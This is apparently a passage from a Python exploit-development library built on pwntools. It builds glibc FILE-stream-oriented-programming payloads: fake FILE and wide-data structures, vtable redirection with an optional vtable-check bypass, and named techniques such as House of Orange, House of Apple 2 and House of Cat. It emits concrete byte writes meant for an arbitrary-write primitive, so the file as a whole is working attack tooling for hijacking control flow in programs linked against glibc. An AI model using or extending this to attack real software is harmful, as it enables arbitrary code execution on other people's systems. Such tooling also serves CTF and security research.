"""Exact-libc, cross-ABI FILE-stream payload construction.

The public :class:`FSOP` builder exposes the axes which matter to an exploit:
the stream object, legacy versus wide dispatch, the activation, and the jump
slot which is expected to reach the callback.  It deliberately does not model
allocator corruption or a particular arbitrary-write primitive.

Standard streams are emitted as sparse patches so live lock and list state is
not zero-filled accidentally.  Heap streams and auxiliary tables are complete
owned objects.  Symbolic pointers retain their exact-libc provenance until
``writes`` or ``materialize`` receives a runtime layout.
"""

from __future__ import annotations

import re
from collections.abc import Mapping
from dataclasses import dataclass, field, replace
from enum import Enum
from types import MappingProxyType
from typing import Any, TypeAlias

from pwnlib.util.packing import pack as pwntools_pack

from .errors import AddressResolutionError, PayloadError
from .libc import LibcError, LibcImage
from .model import Address, Image, Payload, RuntimeLayout
from .rop import AddressExpression, LibcBoundAddress, bind_libc_address
from .target import ABI, Architecture, Endian, FunctionPointerModel, Target


class FSOPError(PayloadError, ValueError):
    """A requested FILE-stream payload is invalid."""


class FSOPCapabilityError(FSOPError):
    """The requested dispatch path lacks a required capability or fact."""


class FSOPOverlayError(FSOPError):
    """An overlay would invalidate the selected dispatch path."""


class FSOPStream(str, Enum):
    STDOUT = "stdout"
    STDERR = "stderr"
    STDIN = "stdin"
    HEAP = "heap"


class FSOPFamily(str, Enum):
    LEGACY = "legacy"
    WIDE = "wide"


class FSOPActivation(str, Enum):
    EXIT = "exit"
    FFLUSH = "fflush"
    FFLUSH_ALL = "fflush-all"
    SEEK = "seek"
    EXPLICIT = "explicit"


class IOJumpSlot(str, Enum):
    """Named entries in glibc's 21-word ``_IO_jump_t``."""

    FINISH = "finish"
    OVERFLOW = "overflow"
    UNDERFLOW = "underflow"
    UFLOW = "uflow"
    PBACKFAIL = "pbackfail"
    XSPUTN = "xsputn"
    XSGETN = "xsgetn"
    SEEKOFF = "seekoff"
    SEEKPOS = "seekpos"
    SETBUF = "setbuf"
    SYNC = "sync"
    DOALLOCATE = "doallocate"
    READ = "read"
    WRITE = "write"
    SEEK = "seek"
    CLOSE = "close"
    STAT = "stat"
    SHOWMANYC = "showmanyc"
    IMBUE = "imbue"

    @property
    def index(self) -> int:
        return _JUMP_INDICES[self]


_JUMP_INDICES: Mapping[IOJumpSlot, int] = MappingProxyType(
    {
        IOJumpSlot.FINISH: 2,
        IOJumpSlot.OVERFLOW: 3,
        IOJumpSlot.UNDERFLOW: 4,
        IOJumpSlot.UFLOW: 5,
        IOJumpSlot.PBACKFAIL: 6,
        IOJumpSlot.XSPUTN: 7,
        IOJumpSlot.XSGETN: 8,
        IOJumpSlot.SEEKOFF: 9,
        IOJumpSlot.SEEKPOS: 10,
        IOJumpSlot.SETBUF: 11,
        IOJumpSlot.SYNC: 12,
        IOJumpSlot.DOALLOCATE: 13,
        IOJumpSlot.READ: 14,
        IOJumpSlot.WRITE: 15,
        IOJumpSlot.SEEK: 16,
        IOJumpSlot.CLOSE: 17,
        IOJumpSlot.STAT: 18,
        IOJumpSlot.SHOWMANYC: 19,
        IOJumpSlot.IMBUE: 20,
    }
)


class FSOPTechnique(str, Enum):
    LEGACY_FAKE_VTABLE = "legacy-fake-vtable"
    HOUSE_OF_ORANGE = "house-of-orange"
    HOUSE_OF_APPLE_2 = "house-of-apple-2"
    HOUSE_OF_CAT = "house-of-cat"
    WIDE_EXPLICIT = "wide-explicit"


class FSOPPredicateKind(str, Enum):
    EXACT = "exact"
    MASK_CLEAR = "mask-clear"
    GREATER_THAN = "greater-than"
    GREATER_THAN_VALUE = "greater-than-value"
    LESS_EQUAL_VALUE = "less-equal-value"


FSOPAddress: TypeAlias = int | Address | AddressExpression | LibcBoundAddress


@dataclass(frozen=True, slots=True)
class IOVtableBounds:
    """Exact half-open bounds accepted by glibc's primary-vtable check."""

    start: FSOPAddress
    end: FSOPAddress
    source: str

    def __post_init__(self) -> None:
        _check_address(self.start, "__io_vtables start")
        _check_address(self.end, "__io_vtables end")
        if not isinstance(self.source, str) or not self.source.strip():
            raise ValueError("__io_vtables bounds source must be a non-empty string")
        start_key, start_offset = _address_key(self.start)
        end_key, end_offset = _address_key(self.end)
        if start_key != end_key or start_offset >= end_offset:
            raise ValueError("__io_vtables bounds must be an increasing range in one address image")

    @classmethod
    def from_libc_offsets(
        cls,
        libc: LibcImage,
        start: int,
        end: int,
        *,
        source: str,
    ) -> IOVtableBounds:
        """Bind artifact-derived ``__io_vtables`` offsets to one libc digest."""

        if not isinstance(libc, LibcImage):
            raise TypeError("libc must be an exact LibcImage")
        return cls(
            bind_libc_address(libc, start, "__io_vtables start"),
            bind_libc_address(libc, end, "__io_vtables end"),
            source,
        )


@dataclass(frozen=True, slots=True)
class DispatchAttestation:
    """Concrete call-site evidence needed by an ABI-dependent dispatch edge."""

    source: str
    seekoff_mode: int | None = None

    def __post_init__(self) -> None:
        if not isinstance(self.source, str) or not self.source.strip():
            raise ValueError("dispatch attestation source must be a non-empty string")
        if self.seekoff_mode is not None and (
            isinstance(self.seekoff_mode, bool) or not isinstance(self.seekoff_mode, int)
        ):
            raise TypeError("attested seekoff_mode must be an int or None")


@dataclass(frozen=True, slots=True)
class IOLayout:
    """Versioned glibc FILE and wide-data offsets for one target ABI."""

    target: Target
    glibc_version: tuple[int, int] | None
    file_size: int
    file_plus_size: int
    wide_data_size: int | None
    jump_table_size: int
    flags2_size: int
    file_offsets: Mapping[str, int]
    wide_offsets: Mapping[str, int]

    def __post_init__(self) -> None:
        object.__setattr__(self, "file_offsets", MappingProxyType(dict(self.file_offsets)))
        object.__setattr__(self, "wide_offsets", MappingProxyType(dict(self.wide_offsets)))

    def pack_flags2(self, value: int) -> bytes:
        """Pack ``_flags2`` without corrupting the 2.41+ backup byte.

        Starting with glibc 2.41 the field occupies exactly 24 bits.  Packing
        three bytes directly is important on big-endian targets; slicing a
        four-byte word would select the wrong physical bytes.
        """

        if isinstance(value, bool) or not isinstance(value, int) or value < 0:
            raise ValueError("_flags2 must be a non-negative int")
        return _pack_integer(self.target, value, self.flags2_size)

    @classmethod
    def for_target(cls, target: Target, glibc_version: tuple[int, int] | None) -> IOLayout:
        if target.bits == 64:
            file_offsets = {
                "flags": 0x00,
                "read_ptr": 0x08,
                "read_end": 0x10,
                "read_base": 0x18,
                "write_base": 0x20,
                "write_ptr": 0x28,
                "write_end": 0x30,
                "buf_base": 0x38,
                "buf_end": 0x40,
                "chain": 0x68,
                "fileno": 0x70,
                "flags2": 0x74,
                "short_backupbuf": 0x77,
                "old_offset": 0x78,
                "vtable_offset": 0x82,
                "lock": 0x88,
                "offset": 0x90,
                "codecvt": 0x98,
                "wide_data": 0xA0,
                "freeres_list": 0xA8,
                "freeres_buf": 0xB0,
                "pad5_or_prevchain": 0xB8,
                "mode": 0xC0,
                "total_written": 0xC8,
                "vtable": 0xD8,
            }
            file_size, file_plus_size = 0xD8, 0xE0
            if glibc_version is None:
                wide_offsets: dict[str, int] = {}
                wide_size = None
            elif glibc_version >= (2, 30):
                wide_offsets = {
                    "write_base": 0x18,
                    "write_ptr": 0x20,
                    "buf_base": 0x30,
                    "codecvt": 0x68,
                    "shortbuf": 0xD8,
                    "vtable": 0xE0,
                }
                wide_size = 0xE8
            else:
                # Through 2.29, _IO_codecvt also contains eight legacy
                # virtual-function pointers before its two iconv objects.
                wide_offsets = {
                    "write_base": 0x18,
                    "write_ptr": 0x20,
                    "buf_base": 0x30,
                    "codecvt": 0x68,
                    "shortbuf": 0x128,
                    "vtable": 0x130,
                }
                wide_size = 0x138
        elif target.abi is ABI.I386_SYSV:
            file_offsets = {
                "flags": 0x00,
                "read_ptr": 0x04,
                "read_end": 0x08,
                "read_base": 0x0C,
                "write_base": 0x10,
                "write_ptr": 0x14,
                "write_end": 0x18,
                "buf_base": 0x1C,
                "buf_end": 0x20,
                "chain": 0x34,
                "fileno": 0x38,
                "flags2": 0x3C,
                "short_backupbuf": 0x3F,
                "old_offset": 0x40,
                "vtable_offset": 0x46,
                "lock": 0x48,
                "offset": 0x4C,
                "codecvt": 0x54,
                "wide_data": 0x58,
                "freeres_list": 0x5C,
                "freeres_buf": 0x60,
                "pad5_or_prevchain": 0x64,
                "mode": 0x68,
                "total_written": 0x6C,
                "vtable": 0x94,
            }
            file_size, file_plus_size = 0x94, 0x98
            wide_offsets, wide_size = _wide_layout_32(glibc_version)
        else:
            file_offsets = {
                "flags": 0x00,
                "read_ptr": 0x04,
                "read_end": 0x08,
                "read_base": 0x0C,
                "write_base": 0x10,
                "write_ptr": 0x14,
                "write_end": 0x18,
                "buf_base": 0x1C,
                "buf_end": 0x20,
                "chain": 0x34,
                "fileno": 0x38,
                "flags2": 0x3C,
                "short_backupbuf": 0x3F,
                "old_offset": 0x40,
                "vtable_offset": 0x46,
                "lock": 0x48,
                "offset": 0x50,
                "codecvt": 0x58,
                "wide_data": 0x5C,
                "freeres_list": 0x60,
                "freeres_buf": 0x64,
                "pad5_or_prevchain": 0x68,
                "mode": 0x6C,
                "total_written": 0x70,
                "vtable": 0x98,
            }
            file_size, file_plus_size = 0x98, 0xA0
            wide_offsets, wide_size = _wide_layout_32(glibc_version)

        return cls(
            target,
            glibc_version,
            file_size,
            file_plus_size,
            wide_size,
            21 * target.word_size,
            3 if glibc_version is not None and glibc_version >= (2, 41) else 4,
            file_offsets,
            wide_offsets,
        )


def _wide_layout_32(glibc_version: tuple[int, int] | None) -> tuple[dict[str, int], int | None]:
    if glibc_version is None:
        return {}, None
    if glibc_version >= (2, 30):
        return {
            "write_base": 0x0C,
            "write_ptr": 0x10,
            "buf_base": 0x18,
            "codecvt": 0x3C,
            "shortbuf": 0x84,
            "vtable": 0x88,
        }, 0x8C
    # The pre-2.30 _IO_codecvt includes eight legacy function pointers.
    return {
        "write_base": 0x0C,
        "write_ptr": 0x10,
        "buf_base": 0x18,
        "codecvt": 0x3C,
        "shortbuf": 0xAC,
        "vtable": 0xB0,
    }, 0xB4


@dataclass(frozen=True, slots=True)
class FSOPPlacement:
    """One complete owned image or one sparse patch target."""

    name: str
    address: FSOPAddress
    data: bytes
    mask: bytes
    owned: bool
    purpose: str

    def __post_init__(self) -> None:
        if not self.name:
            raise ValueError("FSOP placement names cannot be empty")
        _check_address(self.address, f"placement {self.name!r} address")
        if len(self.data) != len(self.mask):
            raise ValueError(f"placement {self.name!r} data and mask lengths differ")
        if not self.data:
            raise ValueError(f"placement {self.name!r} cannot be empty")
        if any(value not in (0, 0xFF) for value in self.mask):
            raise ValueError(f"placement {self.name!r} mask must use only 0x00/0xff bytes")
        if self.owned and any(value != 0xFF for value in self.mask):
            raise ValueError(f"owned placement {self.name!r} must define every byte")


@dataclass(frozen=True, slots=True)
class FSOPRelocation:
    """One protected target-width pointer inside a placement."""

    placement: str
    offset: int
    value: FSOPAddress
    role: str
    width: int

    def __post_init__(self) -> None:
        if not self.placement or not self.role:
            raise ValueError("FSOP relocation placement and role cannot be empty")
        if self.offset < 0 or self.width <= 0:
            raise ValueError("FSOP relocation offset/width are invalid")
        _check_address(self.value, f"relocation {self.role!r}")


@dataclass(frozen=True, slots=True)
class FSOPPredicate:
    """A byte-level condition required to reach the selected jump slot."""

    name: str
    placement: str
    offset: int
    width: int
    kind: FSOPPredicateKind
    expected: int = 0
    mask: int = 0
    other_offset: int | None = None
    signed: bool = False

    def validate(self, placement: FSOPPlacement, target: Target) -> None:
        if self.offset < 0 or self.offset + self.width > len(placement.data):
            raise FSOPError(f"predicate {self.name!r} lies outside placement {placement.name!r}")
        selected_mask = placement.mask[self.offset : self.offset + self.width]
        if any(value != 0xFF for value in selected_mask):
            raise FSOPError(f"predicate {self.name!r} is not fully defined in placement {placement.name!r}")
        value = int.from_bytes(
            placement.data[self.offset : self.offset + self.width],
            target.endian.value,
            signed=self.signed,
        )
        valid = False
        if self.kind is FSOPPredicateKind.EXACT:
            valid = value == self.expected
        elif self.kind is FSOPPredicateKind.MASK_CLEAR:
            valid = value & self.mask == 0
        elif self.kind is FSOPPredicateKind.GREATER_THAN:
            if self.other_offset is None:
                raise FSOPError(f"predicate {self.name!r} has no comparison field")
            if self.other_offset < 0 or self.other_offset + self.width > len(placement.data):
                raise FSOPError(f"predicate {self.name!r} comparison lies outside {placement.name!r}")
            other_mask = placement.mask[self.other_offset : self.other_offset + self.width]
            if any(item != 0xFF for item in other_mask):
                raise FSOPError(f"predicate {self.name!r} comparison field is not fully defined")
            other = int.from_bytes(
                placement.data[self.other_offset : self.other_offset + self.width],
                target.endian.value,
                signed=self.signed,
            )
            valid = value > other
        elif self.kind is FSOPPredicateKind.GREATER_THAN_VALUE:
            valid = value > self.expected
        elif self.kind is FSOPPredicateKind.LESS_EQUAL_VALUE:
            valid = value <= self.expected
        if not valid:
            raise FSOPOverlayError(f"overlay violates {self.name} in {placement.name}: observed {value:#x}")


@dataclass(frozen=True, slots=True)
class FSOPPrecondition:
    """A runtime fact which cannot be established from serialized bytes."""

    name: str
    detail: str

    def __post_init__(self) -> None:
        if not self.name or not self.detail:
            raise ValueError("FSOP precondition name/detail cannot be empty")


@dataclass(frozen=True, slots=True)
class FSOPWrite:
    """Concrete address-tagged bytes ready for an arbitrary-write primitive."""

    address: int
    data: bytes
    placement: str
    offset: int = 0

    def __post_init__(self) -> None:
        if isinstance(self.address, bool) or not isinstance(self.address, int) or self.address < 0:
            raise ValueError("FSOP write address must be a non-negative int")
        if not isinstance(self.data, bytes) or not self.data:
            raise ValueError("FSOP writes require non-empty bytes")
        if not self.placement or self.offset < 0:
            raise ValueError("FSOP write placement/offset are invalid")


@dataclass(frozen=True, slots=True)
class FSOPPayload:
    """Immutable FILE-stream images, relocations, and execution predicates."""

    libc: LibcImage
    layout: IOLayout
    stream: FSOPStream
    family: FSOPFamily
    activation: FSOPActivation
    technique: FSOPTechnique
    callback_slot: IOJumpSlot
    placements: tuple[FSOPPlacement, ...]
    relocations: tuple[FSOPRelocation, ...]
    predicates: tuple[FSOPPredicate, ...]
    preconditions: tuple[FSOPPrecondition, ...]
    metadata: Mapping[str, Any] = field(default_factory=dict)

    def __post_init__(self) -> None:
        object.__setattr__(self, "placements", tuple(self.placements))
        object.__setattr__(self, "relocations", tuple(self.relocations))
        object.__setattr__(self, "predicates", tuple(self.predicates))
        object.__setattr__(self, "preconditions", tuple(self.preconditions))
        object.__setattr__(self, "metadata", MappingProxyType(dict(self.metadata)))
        names = [placement.name for placement in self.placements]
        if len(names) != len(set(names)):
            raise FSOPError("FSOP placement names must be unique")
        for placement in self.placements:
            key, offset = _address_key(placement.address)
            alignment = self._placement_alignment(placement)
            if key[0] == Image.ABSOLUTE.value and offset % alignment:
                raise FSOPError(
                    f"placement {placement.name!r} address is not aligned to its {alignment}-byte ABI requirement"
                )
        self._validate_nonoverlap()
        by_name = {placement.name: placement for placement in self.placements}
        for relocation in self.relocations:
            try:
                placement = by_name[relocation.placement]
            except KeyError as exc:
                raise FSOPError(f"relocation targets missing placement {relocation.placement!r}") from exc
            if relocation.width != self.target.word_size:
                raise FSOPError(f"relocation {relocation.role!r} is not target-word sized")
            if relocation.offset + relocation.width > len(placement.data):
                raise FSOPError(f"relocation {relocation.role!r} lies outside {placement.name!r}")
        self._validate_predicates()

    @property
    def target(self) -> Target:
        return self.libc.target

    def _placement_map(self) -> dict[str, FSOPPlacement]:
        return {placement.name: placement for placement in self.placements}

    def _placement_alignment(self, placement: FSOPPlacement) -> int:
        if placement.name == "file" and self.target.abi is not ABI.I386_SYSV:
            return max(8, self.target.word_size)
        return self.target.word_size

    def _validate_nonoverlap(self) -> None:
        ranges: list[tuple[tuple[object, object | None], int, int, str]] = []
        for placement in self.placements:
            key, offset = _address_key(placement.address)
            ranges.append((key, offset, offset + len(placement.data), placement.name))
        for index, (left_key, left_start, left_end, left_name) in enumerate(ranges):
            for right_key, right_start, right_end, right_name in ranges[index + 1 :]:
                if left_key == right_key and left_start < right_end and right_start < left_end:
                    raise FSOPError(f"placements {left_name!r} and {right_name!r} overlap in the same address image")

    def _validate_predicates(self) -> None:
        placements = self._placement_map()
        for predicate in self.predicates:
            try:
                placement = placements[predicate.placement]
            except KeyError as exc:
                raise FSOPError(f"predicate targets missing placement {predicate.placement!r}") from exc
            predicate.validate(placement, self.target)

    def _resolved_placements(
        self,
        layout: RuntimeLayout | None,
    ) -> tuple[tuple[FSOPPlacement, int, bytes, bytes], ...]:
        resolved: list[tuple[FSOPPlacement, int, bytes, bytes]] = []
        relocations: dict[str, list[FSOPRelocation]] = {}
        for relocation in self.relocations:
            relocations.setdefault(relocation.placement, []).append(relocation)
        for placement in self.placements:
            address = _resolve_address(placement.address, layout)
            self.target.pack(address)
            alignment = self._placement_alignment(placement)
            if address % alignment:
                raise FSOPError(
                    f"resolved placement {placement.name!r} address {address:#x} is not {alignment}-byte aligned"
                )
            if address + len(placement.data) - 1 > self.target.mask:
                raise FSOPError(f"placement {placement.name!r} crosses the target address-space boundary")
            data = bytearray(placement.data)
            mask = bytearray(placement.mask)
            for relocation in relocations.get(placement.name, ()):
                value = _resolve_address(relocation.value, layout)
                packed = self.target.pack(value)
                start, end = relocation.offset, relocation.offset + relocation.width
                data[start:end] = packed
                mask[start:end] = b"\xff" * relocation.width
            resolved.append((placement, address, bytes(data), bytes(mask)))
        for index, (left, left_base, left_data, _) in enumerate(resolved):
            left_end = left_base + len(left_data)
            for right, right_base, right_data, _ in resolved[index + 1 :]:
                right_end = right_base + len(right_data)
                if left_base < right_end and right_base < left_end:
                    raise FSOPError(
                        f"resolved placements {left.name!r} and {right.name!r} overlap "
                        f"at {max(left_base, right_base):#x}"
                    )
        return tuple(resolved)

    def writes(self, layout: RuntimeLayout | None = None) -> tuple[FSOPWrite, ...]:
        """Return the minimal concrete spans, preserving sparse live fields."""

        writes: list[FSOPWrite] = []
        for placement, base, data, mask in self._resolved_placements(layout):
            offset = 0
            while offset < len(mask):
                while offset < len(mask) and mask[offset] == 0:
                    offset += 1
                start = offset
                while offset < len(mask) and mask[offset] == 0xFF:
                    offset += 1
                if start != offset:
                    writes.append(FSOPWrite(base + start, data[start:offset], placement.name, start))
        return tuple(writes)

    def materialize(
        self,
        layout: RuntimeLayout | None = None,
        *,
        originals: Mapping[str, bytes] | None = None,
    ) -> tuple[FSOPWrite, ...]:
        """Return one complete image per placement.

        Sparse standard-stream placements require caller-supplied original
        bytes.  This prevents zero placeholders from silently clobbering live
        locks, chain pointers, and unrelated stream state.
        """

        supplied = originals or {}
        writes: list[FSOPWrite] = []
        for placement, base, data, mask in self._resolved_placements(layout):
            if all(value == 0xFF for value in mask):
                merged = data
            else:
                try:
                    original = supplied[placement.name]
                except KeyError as exc:
                    raise FSOPError(
                        f"original bytes are required to materialize sparse placement {placement.name!r}"
                    ) from exc
                if not isinstance(original, bytes) or len(original) != len(data):
                    raise FSOPError(f"original for {placement.name!r} must be exactly {len(data)} bytes")
                output = bytearray(original)
                for index, selected in enumerate(mask):
                    if selected:
                        output[index] = data[index]
                merged = bytes(output)
            writes.append(FSOPWrite(base, merged, placement.name, 0))
        return tuple(writes)

    def overlay(
        self,
        data: bytes | Payload,
        *,
        offset: int = 0,
        placement: str = "file",
    ) -> FSOPPayload:
        """Overlay callback argument bytes and re-prove execution predicates."""

        if isinstance(data, Payload):
            if data.target != self.target:
                raise FSOPOverlayError(
                    f"overlay target {data.target.name} does not match FSOP target {self.target.name}"
                )
            raw = data.data
        elif isinstance(data, bytes):
            raw = data
        else:
            raise TypeError("FSOP overlay must be bytes or Payload")
        if isinstance(offset, bool) or not isinstance(offset, int) or offset < 0:
            raise FSOPOverlayError("overlay offset must be a non-negative int")
        placements = self._placement_map()
        try:
            selected = placements[placement]
        except KeyError as exc:
            raise FSOPOverlayError(f"unknown FSOP placement {placement!r}") from exc
        if offset + len(raw) > len(selected.data):
            raise FSOPOverlayError(f"overlay does not fit placement {placement!r} bounds ({offset:#x}+{len(raw):#x})")

        overlay_end = offset + len(raw)
        if not selected.owned and any(value == 0 for value in selected.mask[offset:overlay_end]):
            raise FSOPOverlayError(
                f"overlay would define preserved live bytes in sparse placement {placement!r}; "
                "only builder-owned fields are overlayable"
            )
        for relocation in self.relocations:
            if relocation.placement != placement:
                continue
            relocation_end = relocation.offset + relocation.width
            overlap_start = max(offset, relocation.offset)
            overlap_end = min(overlay_end, relocation_end)
            if overlap_start >= overlap_end:
                continue
            if not isinstance(relocation.value, int):
                raise FSOPOverlayError(
                    f"overlay conflicts with symbolic relocation {relocation.role!r} in {placement!r}"
                )
            packed = self.target.pack(relocation.value)
            expected = packed[overlap_start - relocation.offset : overlap_end - relocation.offset]
            observed = raw[overlap_start - offset : overlap_end - offset]
            if observed != expected:
                raise FSOPOverlayError(f"overlay conflicts with relocation {relocation.role!r} in {placement!r}")

        output = bytearray(selected.data)
        mask = bytearray(selected.mask)
        output[offset:overlay_end] = raw
        mask[offset:overlay_end] = b"\xff" * len(raw)
        replacement = replace(selected, data=bytes(output), mask=bytes(mask))
        updated = tuple(replacement if item.name == placement else item for item in self.placements)
        try:
            return replace(self, placements=updated)
        except FSOPOverlayError:
            raise
        except FSOPError as exc:
            raise FSOPOverlayError(str(exc)) from exc

    def overlay_arg0(self, data: bytes | Payload) -> FSOPPayload:
        """Convenience alias for a FILE-pointer callback's argument zero."""

        return self.overlay(data, placement="file", offset=0)


_STANDARD_STREAM_SYMBOLS: Mapping[FSOPStream, str] = MappingProxyType(
    {
        FSOPStream.STDOUT: "_IO_2_1_stdout_",
        FSOPStream.STDERR: "_IO_2_1_stderr_",
        FSOPStream.STDIN: "_IO_2_1_stdin_",
    }
)


def _enum(enum_type: type[Enum], value: object, description: str):
    if isinstance(value, enum_type):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower().replace("_", "-")
        try:
            return enum_type(normalized)
        except ValueError:
            pass
    choices = ", ".join(item.value for item in enum_type)
    raise ValueError(f"unknown {description} {value!r}; choose from {choices}")


def _parse_version(value: str | tuple[int, int] | None) -> tuple[int, int] | None:
    if value is None:
        return None
    if isinstance(value, tuple):
        if len(value) != 2 or any(isinstance(item, bool) or not isinstance(item, int) or item < 0 for item in value):
            raise ValueError("glibc version tuple must contain two non-negative integers")
        return value
    if not isinstance(value, str):
        raise TypeError("glibc_version must be a string, (major, minor), or None")
    match = re.match(r"^\s*(\d+)\.(\d+)", value)
    if match is None:
        raise ValueError(f"cannot parse glibc version {value!r}")
    return int(match.group(1)), int(match.group(2))


def _check_address(value: object, description: str) -> None:
    if isinstance(value, bool) or not isinstance(value, (int, Address, AddressExpression, LibcBoundAddress)):
        raise TypeError(f"{description} must be an int or symbolic Address value")
    if isinstance(value, int) and value < 0:
        raise ValueError(f"{description} cannot be negative")


def _is_unbound_libc(value: FSOPAddress) -> bool:
    if isinstance(value, AddressExpression):
        value = value.base
    return isinstance(value, Address) and (value.image is Image.LIBC or value.image == Image.LIBC.value)


def _require_exact_address(libc: LibcImage, value: FSOPAddress, description: str) -> None:
    _check_address(value, description)
    if isinstance(value, LibcBoundAddress) and value.identity != libc.identity:
        raise FSOPError(f"{description} belongs to a different exact libc artifact")
    if _is_unbound_libc(value):
        raise FSOPError(f"{description} is libc-relative but lacks exact LibcIdentity binding")


def _resolve_address(value: FSOPAddress, layout: RuntimeLayout | None) -> int:
    if isinstance(value, int):
        return value
    try:
        return value.resolve(layout)
    except AddressResolutionError:
        raise
    except Exception as exc:
        raise AddressResolutionError(f"unable to resolve FSOP address {value!r}: {exc}") from exc


def _address_key(value: FSOPAddress) -> tuple[tuple[object, object | None], int]:
    """Return a comparable symbolic image key and offset."""

    if isinstance(value, int):
        return (Image.ABSOLUTE.value, None), value
    if isinstance(value, LibcBoundAddress):
        return (Image.LIBC.value, value.identity.sha256), value.offset + value.addend
    if isinstance(value, AddressExpression):
        image = value.base.image.value if isinstance(value.base.image, Image) else value.base.image
        return (image, None), value.base.value + value.addend
    image = value.image.value if isinstance(value.image, Image) else value.image
    return (image, None), value.value


def _known_low_bit(value: FSOPAddress) -> int:
    if isinstance(value, int):
        return value & 1
    if isinstance(value, LibcBoundAddress):
        return (value.offset + value.addend) & 1
    if isinstance(value, AddressExpression):
        return (value.base.value + value.addend) & 1
    return value.value & 1


def _add_address(value: FSOPAddress, addend: int) -> FSOPAddress:
    _check_address(value, "base address")
    if isinstance(addend, bool) or not isinstance(addend, int):
        raise TypeError("address addend must be an int")
    if addend == 0:
        return value
    if isinstance(value, int):
        result = value + addend
        if result < 0:
            raise FSOPError("address arithmetic produced a negative value")
        return result
    if isinstance(value, Address):
        return AddressExpression(value, addend)
    return value + addend


def _pack_integer(target: Target, value: int, width: int, *, signed: bool = False) -> bytes:
    try:
        with target.local_context():
            return pwntools_pack(
                value,
                word_size=width * 8,
                endianness=target.endian.value,
                sign=signed,
            )
    except (OverflowError, ValueError) as exc:
        raise FSOPError(f"integer {value!r} does not fit a {width}-byte glibc field") from exc


def _symbol(libc: LibcImage, name: str) -> LibcBoundAddress:
    try:
        return bind_libc_address(libc, name)
    except LibcError as exc:
        raise FSOPError(f"required exact libc symbol {name!r} is missing") from exc


@dataclass(slots=True)
class _ImageBuilder:
    name: str
    address: FSOPAddress
    data: bytearray
    mask: bytearray
    owned: bool
    purpose: str

    @classmethod
    def create(
        cls,
        name: str,
        address: FSOPAddress,
        size: int,
        *,
        owned: bool,
        purpose: str,
    ) -> _ImageBuilder:
        return cls(
            name,
            address,
            bytearray(size),
            bytearray(b"\xff" * size if owned else bytes(size)),
            owned,
            purpose,
        )

    def bytes(self, offset: int, value: bytes) -> None:
        end = offset + len(value)
        if offset < 0 or end > len(self.data):
            raise FSOPError(f"field write lies outside placement {self.name!r}")
        self.data[offset:end] = value
        self.mask[offset:end] = b"\xff" * len(value)

    def integer(self, target: Target, offset: int, value: int, width: int, *, signed: bool = False) -> None:
        self.bytes(offset, _pack_integer(target, value, width, signed=signed))

    def pointer_placeholder(self, offset: int, width: int) -> None:
        self.bytes(offset, bytes(width))

    def freeze(self) -> FSOPPlacement:
        return FSOPPlacement(
            self.name,
            self.address,
            bytes(self.data),
            bytes(self.mask),
            self.owned,
            self.purpose,
        )


@dataclass(frozen=True, slots=True)
class FSOP:
    """Axis-driven legacy and wide glibc FILE payload builder."""

    libc: LibcImage
    stream: FSOPStream | str = FSOPStream.HEAP
    family: FSOPFamily | str = FSOPFamily.LEGACY
    address: FSOPAddress | None = None
    storage: FSOPAddress | None = None
    io_vtables: IOVtableBounds | None = None
    glibc_version: str | tuple[int, int] | None = None
    allow_vtable_bypass: bool = False
    version: tuple[int, int] | None = field(init=False)
    layout: IOLayout = field(init=False)

    def __post_init__(self) -> None:
        if not isinstance(self.libc, LibcImage):
            raise TypeError("libc must be an exact LibcImage")
        stream = _enum(FSOPStream, self.stream, "FSOP stream")
        family = _enum(FSOPFamily, self.family, "FSOP family")
        object.__setattr__(self, "stream", stream)
        object.__setattr__(self, "family", family)
        if not isinstance(self.allow_vtable_bypass, bool):
            raise TypeError("allow_vtable_bypass must be bool")

        identity_version = _parse_version(self.libc.identity.glibc_version)
        requested_version = _parse_version(self.glibc_version)
        if requested_version is not None and identity_version is not None and requested_version != identity_version:
            raise FSOPError(
                f"requested glibc {requested_version[0]}.{requested_version[1]} conflicts with exact artifact metadata "
                f"{identity_version[0]}.{identity_version[1]}"
            )
        version = requested_version or identity_version
        object.__setattr__(self, "version", version)
        object.__setattr__(self, "layout", IOLayout.for_target(self.libc.target, version))

        if stream is FSOPStream.HEAP:
            if self.address is None:
                raise FSOPCapabilityError("heap FSOP requires the fake FILE address")
            _require_exact_address(self.libc, self.address, "heap FILE address")
        elif self.address is not None:
            raise FSOPCapabilityError("standard-stream addresses come from the exact libc and cannot be overridden")
        if self.storage is not None:
            _require_exact_address(self.libc, self.storage, "FSOP auxiliary storage")
        if self.io_vtables is not None:
            if not isinstance(self.io_vtables, IOVtableBounds):
                raise TypeError("io_vtables must be IOVtableBounds or None")
            _require_exact_address(self.libc, self.io_vtables.start, "__io_vtables start")
            _require_exact_address(self.libc, self.io_vtables.end, "__io_vtables end")
        if stream is not FSOPStream.HEAP and self.storage is None:
            raise FSOPCapabilityError("standard-stream FSOP requires writable auxiliary storage")

    @property
    def target(self) -> Target:
        return self.libc.target

    @property
    def file_address(self) -> FSOPAddress:
        if self.stream is FSOPStream.HEAP:
            assert self.address is not None
            return self.address
        return _symbol(self.libc, _STANDARD_STREAM_SYMBOLS[self.stream])

    @property
    def storage_address(self) -> FSOPAddress:
        if self.storage is not None:
            return self.storage
        return _add_address(self.file_address, self.layout.file_plus_size)

    def _callback(
        self,
        function: str | FSOPAddress,
        callback_is_descriptor: bool,
    ) -> tuple[FSOPAddress, str]:
        if not isinstance(callback_is_descriptor, bool):
            raise TypeError("callback_is_descriptor must be bool")
        callback_from_symbol = isinstance(function, str)
        if callback_from_symbol:
            if not function:
                raise ValueError("callback symbol cannot be empty")
            callback = _symbol(self.libc, function)
            label = function
        else:
            _require_exact_address(self.libc, function, "FSOP callback")
            callback = function
            label = "explicit callback"
        if self.target.function_pointer_model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR:
            if not callback_is_descriptor:
                raise FSOPCapabilityError(
                    "PPC64 ELFv1 FSOP callback must be attested as a pointer to an .opd function descriptor"
                )
        elif callback_is_descriptor:
            raise FSOPCapabilityError("callback_is_descriptor is only valid for PPC64 ELFv1")
        if (
            self.target.function_pointer_model is FunctionPointerModel.THUMB_STATE_BIT
            and not callback_from_symbol
            and _known_low_bit(callback) != 1
        ):
            raise FSOPCapabilityError(
                "raw Thumb callback must already carry the ISA-state bit; exact libc symbols preserve st_value"
            )
        return callback, label

    def _validated_primary_vtable(self, bias: int) -> tuple[FSOPAddress, str, bool]:
        base = _symbol(self.libc, "_IO_wfile_jumps")
        primary = _add_address(base, bias)
        if 0 <= bias < self.layout.jump_table_size:
